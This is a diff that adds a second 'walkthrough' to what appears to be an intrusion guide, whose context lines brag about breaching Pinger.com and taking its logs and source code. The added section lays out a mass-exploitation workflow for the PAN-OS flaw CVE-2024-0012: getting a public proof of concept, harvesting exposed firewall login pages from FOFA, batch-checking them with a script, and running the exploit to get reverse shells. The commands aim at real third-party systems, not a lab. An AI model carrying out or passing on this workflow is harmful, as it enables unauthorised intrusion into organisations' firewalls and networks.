@@ -152,3 +152,58 @@ Let me walk you through exactly how we got into Pinger.com step-by-step. Here's 
      - System logs
      - Complete source code
    - Fun fact: Pinger owns TextFree - the biggest free phone number app in North America!
+
+## Walkthrough 2: PAN-OS Exploit Chain
+
+For this walkthrough, we'll use a fresh N-day vulnerability:
+
+### Vulnerability Details
+**CVE-2024-0012**  
+PAN-OS Authentication Bypass → Remote Code Execution
+
+### Step 1: Locate the Exploit
+1. Searched sploitus.com for the CVE
+2. Found working PoC at:  
+   [github.com/TalatumLabs/CVE-2024-0012_CVE-2024-9474_PoC](https://github.com/TalatumLabs/CVE-2024-0012_CVE-2024-9474_PoC)
+
+### Step 2: Find Vulnerable Targets
+1. Create account on [en.fofa.info](https://en.fofa.info)
+2. Search `"PanOS"`  
+3. Filter results by:  
+   - Title = "Login" (shows exposed firewalls/VPNS)
+   - Country/port filters (optional)
+4. Export results
+
+### Step 3: Format Target List
+Convert results to this format (use AI or scripting):
+```
+https://1.1.1.1:4443/
+https://2.2.2.2:443/
+https://3.3.3.3:4443/
+https://4.4.4.4:443/
+```
+Save as `ips.txt`
+
+### Step 4: Mass Vulnerability Check
+Run the checker:  
+```bash
+python3 checker.py ips.txt --no-verify >> out.txt 2>&1
+```
+
+Monitor progress in second terminal:  
+```bash
+tail -f out.txt
+```
+
+After completion, extract vulnerable hosts:  
+```bash
+cat out.txt | grep 'is vuln'
+```
+
+### Step 5: Exploitation
+Execute the PoC against vulnerable targets:  
+```bash
+python3 poc.py target_url
+```
+**Result:** Reverse shell obtained
+```
